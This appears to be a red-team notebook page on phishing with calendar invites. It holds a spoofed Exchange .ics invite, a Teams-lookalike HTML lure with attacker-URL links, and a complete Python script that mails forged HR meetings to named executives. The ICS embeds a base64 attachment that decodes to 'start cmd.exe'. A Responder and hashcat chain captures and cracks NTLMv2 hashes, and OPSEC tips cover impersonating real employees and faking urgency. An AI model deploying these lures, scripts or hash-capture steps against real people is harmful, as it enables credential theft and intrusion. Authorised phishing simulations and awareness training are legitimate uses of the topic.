---
title: Phishing with Calendars
draft: false
tags:
  - red-teaming
  - phishing
  - social-engineering
  - windows
  - ics
---

Calendar phishing exploits the automatic processing of `.ics` (iCalendar) files by email clients. When a user receives an email with an `.ics` attachment, Outlook and most calendar clients **automatically add the event to the calendar** and show the invite without requiring the user to open a separate attachment — bypassing the typical "don't open attachments" user awareness training. The event description and links are shown inline in the calendar app, making malicious URLs much more likely to be clicked.

An ICS file is essentially a plain text file that follows a specific syntax to represent calendar events. It begins with a header indicating the version and method of the calendar data being shared, and its main structure consists of components such as _VEVENT_ for calendar events, _VTODO_ for to-do items, and _VJOURNAL_ for journal entries.

The `ORGANIZER` property specifies the person or entity responsible for the event. This field typically includes an email address and can also feature a display name.
```
ORGANIZER;CN="John Doe":mailto:johndoe@example.com
```

The timing of an event is crucial, and the `DTSTART` and `DTEND` properties specify the start and end times, respectively. These fields can include time zone information to avoid confusion across different geographic locations.

```
DTSTART;TZID=America/New_York:20231015T090000
DTEND;TZID=America/New_York:20231015T100000
```

The `DESCRIPTION` property provides additional details about the event, such as the agenda, location, or other relevant information. This field helps clarify the context and purpose of the event.

```
DESCRIPTION:Weekly team meeting to discuss project updates and milestones.
```

# Manual Attack

Example `iCalendar.ics`:
```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=Peter:mailto:peter@corp1.com
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://meeting.corp1.com
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

VEVENT section:

- The _DTSTART_ and _DTEND_ fields specify the event's start and end times. Adversaries often set these to typical business hours to improve the perceived legitimacy of the event.

- The _ORGANIZER_ field contains our custom name and email. The goal is to make the event appear to come from a trusted source. Adversaries often load the _DESCRIPTION_ field with malicious links or instructions that direct victims to phishing sites or malware downloads.

- Finally, the _UID_ is a unique identifier for the event, ensuring it can bypass filters and appear as a distinct calendar entry in the target's schedule, making detection more difficult.

Custom email body email.html:
```html
<p class=MsoNormal style='background:white'><span style='color:black'>We are reaching out to inform you of an urgent meeting scheduled by the HR Department that requires your immediate attention.<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif; color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif; color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
```

> [!Note]
> Check the `href` sections to replace the `[ATTACKER_URL]` placeholders with our attacker IP address.

Send email with calendar invitation:
```bash
$ sendEmail -s 192.168.50.121 -t offsec@corp1.com -f attacker@corp1.com -u "test"  -o message-content-type=html -o message-file=./email.html -a iCalendar.ics

Parameters
-s: SMTP server address
-t: target recipient
-f: sender address
-u: subject
-o message-content-type: format the message as HTML
-o message-file: crafted template
-a: attachment
```

---
# Automating the attack

Email template (`email_template.html`):
```html
<p class=MsoNormal style='background:white'><span style='color:black'>{EVENT_TEXT}<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif;color:#252424'><a href="{EVENT_URL}" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif;color:#252424'><a href="https://aka.ms/JoinTeamsMeeting" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="{EVENT_URL}" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
```

> [!Note]
> Replace the placeholders `{EVENT_TEXT}` and `{EVENT_URL}` with custom context meeting text and attacker IP address.

Create the malicious ICS with placeholders (`iCalendar_template.ics `):
```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\c3RhcnQgY21kLmV4ZQo=
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

Create the malicious script (`fakeics.py`):
```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate


# email settings
EMAIL_SUBJECT = "HR Meeting"

# event settings
EVENT_SUMMARY = "HR meeting"

ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]

# template settings
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent company-wide changes and policies. Your attendance is highly encouraged as we will be discussing essential updates that impact all employees.

Topics will include:

- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""

def load_template():
    template = ""
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        template = f.read()
    return template


def prepare_template(event_url):
    email_template = load_template()
    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)
    return email_template


def load_ics():
    ics = ""
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        ics = f.read()
    return ics


def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    ics_template = load_ics()
    ics_template = ics_template.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,  # Use event_url as DESCRIPTION
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )
    return ics_template


def generate_attendees():
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee)
        )
    return "\r\n".join(attendees)


def send_email(smtp_server, sender_email, to, event_url):
    print('Sending email to: ' + to)

    # in .ics file timezone is set to be utc
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now()
    dtoff = datetime.timedelta(minutes=utc_offset + 5)  # meeting has started 5 minutes ago
    duration = datetime.timedelta(hours=1)  # meeting duration
    ddtstart = ddtstart - dtoff
    dtend = ddtstart + duration
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = sender_email
    msg['To'] = to

    part_email = MIMEText(email_body, "html")
    part_cal = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % ("invite.ics"))
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % ("invite.ics"))

    eml_atch = MIMEBase('text/plain', '')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()


def main():
    if len(sys.argv) != 5:
        print("Usage: python fakemeeting.py <smtp_server> <sender_email> <recipient_email> <event_url>")
        sys.exit(1)

    smtp_server = sys.argv[1]
    sender_email = sys.argv[2]
    recipient_email = sys.argv[3]
    event_url = sys.argv[4]

    send_email(smtp_server, sender_email, recipient_email, event_url)


if __name__ == "__main__":
    main()
```

Usage:
```bash
$ python3 fakeics.py SMTP_SERVER_IP SENDER_EMAIL RECIPIENT_EMAIL PHISHING_URL

Parameters:
PHISHING_URL: format http://ATTACKER_IP...
```

---
# Credentials stealing with Responder

Start responder:
```bash
$ sudo responder -I tun0
```

Run the phishing script:
```bash
$ python3 fakeics.py SMTP_SERVER_IP SENDER_EMAIL RECIPIENT_EMAIL PHISHING_URL
```

Once the recipient clicks an href containing the attacker IP address, it will be displayed with a fake login panel:
![[Pasted image 20260628194931.png]]

Crack the hash:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> [!Warning] OPSEC
> - The `DESCRIPTION` field in the ICS is where the phishing URL appears — make it look like a real Teams/Zoom meeting link using a URL shortener or a convincing lookalike domain.
> - Set `DTSTART` to a time slightly in the past (e.g., "meeting started 5 minutes ago") to create urgency and prompt the victim to click immediately.
> - The `ORGANIZER` display name (`CN=`) is what the victim sees — use a real employee's name obtained via OSINT (LinkedIn, company website) for maximum credibility.
> - Responder captures NTLMv2 hashes when the victim's machine automatically tries to authenticate to the attacker IP in the calendar link. This works even without the victim clicking — some clients pre-fetch URLs.
> - Use `hashcat -m 5600` for NTLMv2 (Net-NTLMv2). If the hash is NTLMv1, use `-m 5500`.

---
# Related Notes
- [[Pretexting]] — social engineering templates and lure design
- [[Client-Side Attacks]] — other delivery vectors (spear phishing email, HTML smuggling, BEEF)
- [[Phishing with Microsoft Office]] — document-based phishing via VBA macros